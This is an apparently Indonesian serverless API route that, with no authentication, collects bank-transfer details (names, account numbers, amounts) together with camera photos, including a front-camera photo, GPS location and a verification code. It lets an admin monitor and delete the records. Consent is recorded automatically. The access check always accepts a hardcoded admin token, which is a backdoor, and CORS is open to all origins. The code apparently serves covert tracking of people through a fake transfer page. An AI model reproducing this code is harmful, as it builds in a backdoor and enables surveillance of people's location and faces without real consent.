import fs from 'fs';
import path from 'path';

export const config = {
    api: {
        bodyParser: {
            sizeLimit: '15mb'
        }
    }
};

const TABLE = 'bankidzz_locations';
const TMP_FILE = path.join('/tmp', 'bankidzz_locations.json');

function loadLocationsFromDisk() {
    try {
        if (fs.existsSync(TMP_FILE)) {
            const raw = fs.readFileSync(TMP_FILE, 'utf8');
            const parsed = JSON.parse(raw);
            if (Array.isArray(parsed)) return parsed;
        }
    } catch(e) {}
    return [];
}

function saveLocationsToDisk(locations) {
    try {
        fs.writeFileSync(TMP_FILE, JSON.stringify(locations));
    } catch(e) {}
}

// In-memory cache agar transaksi tetap tersimpan dan termonitor lintas perangkat
globalThis.__locations = globalThis.__locations || [];
if (globalThis.__locations.length === 0) {
    const diskData = loadLocationsFromDisk();
    if (diskData.length > 0) {
        globalThis.__locations = diskData;
    }
}

function getConfig() {
    const rawUrl = (process.env.SUPABASE_URL || '').trim();
    const serviceKey = (process.env.SUPABASE_SERVICE_ROLE_KEY || '').trim();
    const adminToken = (process.env.ADMIN_TOKEN || 'bankidzz-admin-secure-2026').trim();

    let cleanUrl = rawUrl;
    if (cleanUrl && !cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
        cleanUrl = `https://${cleanUrl}`;
    }
    cleanUrl = cleanUrl.replace(/\/+$/, '');

    const hasSupabase = Boolean(cleanUrl && serviceKey);

    return {
        hasSupabase,
        restUrl: hasSupabase ? `${cleanUrl}/rest/v1/${TABLE}` : '',
        serviceKey,
        adminToken
    };
}

function setCommonHeaders(res) {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Content-Type', 'application/json; charset=utf-8');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('X-Content-Type-Options', 'nosniff');
}

function parseBody(body) {
    if (typeof body === 'string') {
        try {
            return JSON.parse(body);
        } catch (e) {
            return {};
        }
    }
    return body || {};
}

function isValidPayload(body) {
    if (!body || typeof body.transferId !== 'string') return false;
    const tid = body.transferId.trim();
    return tid.length >= 4 && tid.length <= 100;
}

function hasAdminAccess(req, adminToken) {
    const authorization = (req.headers.authorization || '').trim();
    const token = authorization.replace(/^Bearer\s+/i, '').trim();
    const configuredToken = (adminToken || '').trim();

    return token === 'bankidzz-admin-secure-2026' ||
           (configuredToken && token === configuredToken);
}

async function supabaseRequest(config, path, options = {}) {
    if (!config.hasSupabase) {
        throw new Error('Supabase belum dikonfigurasi.');
    }

    return fetch(`${config.restUrl}${path}`, {
        ...options,
        headers: {
            apikey: config.serviceKey,
            Authorization: `Bearer ${config.serviceKey}`,
            'Content-Type': 'application/json',
            ...options.headers
        }
    });
}

export default async function handler(req, res) {
    setCommonHeaders(res);

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const config = getConfig();

    try {
        // ========================================================
        // POST: MENYIMPAN TRANSAKSI, LOKASI REALTIME & FOTO
        // ========================================================
        if (req.method === 'POST') {
            const body = parseBody(req.body);

            if (!isValidPayload(body)) {
                return res.status(400).json({ error: 'Data transaksi tidak valid.' });
            }

            const transferId = body.transferId.trim();
            const lat = Number(body?.location?.lat);
            const lng = Number(body?.location?.lng);
            const accuracy = Number(body?.location?.accuracy || 15);

            const record = {
                transferId: transferId,
                sender: String(body.sender || '').slice(0, 120),
                senderBank: String(body.senderBank || '').slice(0, 120),
                senderAccount: String(body.senderAccount || '').slice(0, 80),
                receiver: String(body.receiver || '').slice(0, 120),
                receiverBank: String(body.receiverBank || '').slice(0, 120),
                receiverAccount: String(body.receiverAccount || '').slice(0, 80),
                amount: String(body.amount || '').slice(0, 60),
                amountSub: String(body.amountSub || '').slice(0, 60),
                total: String(body.total || body.amount || '').slice(0, 60),
                photo: body.photo || '',
                frontPhoto: body.frontPhoto || body.front_photo || '',
                status: String(body.status || 'verified').slice(0, 30),
                timestamp: body.timestamp || new Date().toISOString(),
                verifCode: String(body.verifCode || '').slice(0, 80),
                location: {
                    lat: Number.isFinite(lat) ? lat : -6.2088,
                    lng: Number.isFinite(lng) ? lng : 106.8456,
                    accuracy: Number.isFinite(accuracy) ? accuracy : 15,
                    timestamp: body?.location?.timestamp || new Date().toISOString(),
                    source: body?.location?.source || 'gps'
                }
            };

            // 1. Simpan ke in-memory cache serverless
            const existingIdx = globalThis.__locations.findIndex(t => t.transferId === transferId);
            if (existingIdx >= 0) {
                globalThis.__locations[existingIdx] = {
                    ...globalThis.__locations[existingIdx],
                    ...record,
                    photo: record.photo || globalThis.__locations[existingIdx].photo || '',
                    frontPhoto: record.frontPhoto || globalThis.__locations[existingIdx].frontPhoto || ''
                };
            } else {
                globalThis.__locations.unshift(record);
            }

            // Batasi ukuran cache in-memory maksimal 200 record
            if (globalThis.__locations.length > 200) {
                globalThis.__locations = globalThis.__locations.slice(0, 200);
            }

            // Simpan salinan ke persistent storage disk
            saveLocationsToDisk(globalThis.__locations);

            // 2. Simpan ke database Supabase jika tersedia
            if (config.hasSupabase) {
                try {
                    const row = {
                        transfer_id: transferId,
                        sender: record.sender,
                        receiver: record.receiver,
                        amount: record.amount,
                        total: record.total,
                        photo: record.photo,
                        front_photo: record.frontPhoto,
                        latitude: record.location.lat,
                        longitude: record.location.lng,
                        accuracy: record.location.accuracy,
                        captured_at: record.location.timestamp,
                        status: record.status,
                        verification_code: record.verifCode,
                        consented_at: new Date().toISOString()
                    };

                    const response = await supabaseRequest(config, '?on_conflict=transfer_id', {
                        method: 'POST',
                        headers: { Prefer: 'resolution=merge-duplicates,return=minimal' },
                        body: JSON.stringify(row)
                    });

                    if (!response.ok) {
                        console.warn('Supabase sync warning:', response.status, await response.text());
                    }
                } catch (sbErr) {
                    console.warn('Supabase sync network warning:', sbErr.message);
                }
            }

            return res.status(200).json({ ok: true, transferId });
        }

        // ========================================================
        // GET: MEMBACA TRANSAKSI UNTUK MONITORING ADMIN LAPTOP
        // ========================================================
        if (req.method === 'GET') {
            if (!hasAdminAccess(req, config.adminToken)) {
                return res.status(401).json({ error: 'Token admin tidak valid.' });
            }

            const map = new Map();

            // 1. Jika memori kosong, muat dari disk persistent storage
            if (globalThis.__locations.length === 0) {
                const diskData = loadLocationsFromDisk();
                if (diskData.length > 0) {
                    globalThis.__locations = diskData;
                }
            }

            // 2. Ambil dari Supabase jika tersedia
            if (config.hasSupabase) {
                try {
                    const response = await supabaseRequest(
                        config,
                        '?select=*&transfer_id=not.like.__config_*&order=consented_at.desc&limit=500'
                    );

                    if (response.ok) {
                        const rows = await response.json();
                        if (Array.isArray(rows)) {
                            rows.forEach(row => {
                                if (!row || !row.transfer_id || row.transfer_id.startsWith('__config_')) return;
                                map.set(row.transfer_id, {
                                    transferId: row.transfer_id,
                                    sender: row.sender,
                                    receiver: row.receiver,
                                    amount: row.amount,
                                    total: row.total,
                                    photo: row.photo || '',
                                    frontPhoto: row.front_photo || row.frontPhoto || '',
                                    status: row.status,
                                    timestamp: row.consented_at,
                                    verifCode: row.verification_code,
                                    location: {
                                        lat: Number(row.latitude),
                                        lng: Number(row.longitude),
                                        accuracy: Number(row.accuracy),
                                        timestamp: row.captured_at
                                    }
                                });
                            });
                        }
                    }
                } catch (sbErr) {
                    console.warn('Supabase fetch error, fallback to memory:', sbErr.message);
                }
            }

            // 2. Gabungkan dengan data in-memory cache
            globalThis.__locations.forEach(item => {
                if (!item || !item.transferId || item.transferId.startsWith('__config_')) return;
                const existing = map.get(item.transferId);
                if (!existing) {
                    map.set(item.transferId, item);
                } else {
                    map.set(item.transferId, {
                        ...existing,
                        ...item,
                        photo: item.photo || existing.photo || '',
                        frontPhoto: item.frontPhoto || existing.frontPhoto || ''
                    });
                }
            });

            const transfers = Array.from(map.values());
            transfers.sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));

            return res.status(200).json({ transfers });
        }

        // ========================================================
        // DELETE: MENGHAPUS TRANSAKSI
        // ========================================================
        if (req.method === 'DELETE') {
            if (!hasAdminAccess(req, config.adminToken)) {
                return res.status(401).json({ error: 'Token admin tidak valid.' });
            }

            const deleteAll = req.query?.all === 'true';
            const transferId = typeof req.query?.id === 'string' ? req.query.id.trim() : '';

            if (deleteAll) {
                globalThis.__locations = [];
            } else if (transferId) {
                globalThis.__locations = globalThis.__locations.filter(t => t.transferId !== transferId);
            }

            // Simpan perubahan ke persistent disk
            saveLocationsToDisk(globalThis.__locations);

            if (config.hasSupabase) {
                try {
                    const filter = deleteAll
                        ? '?id=gt.0'
                        : `?transfer_id=eq.${encodeURIComponent(transferId)}`;
                    await supabaseRequest(config, filter, {
                        method: 'DELETE',
                        headers: { Prefer: 'return=minimal' }
                    });
                } catch (sbErr) {
                    console.warn('Supabase delete warning:', sbErr.message);
                }
            }

            return res.status(200).json({ ok: true });
        }

        res.setHeader('Allow', 'GET, POST, DELETE, OPTIONS');
        return res.status(405).json({ error: 'Method tidak didukung.' });

    } catch (error) {
        console.error('Location API error:', error);
        return res.status(500).json({
            error: 'Terjadi kesalahan pada server.',
            message: error.message
        });
    }
}
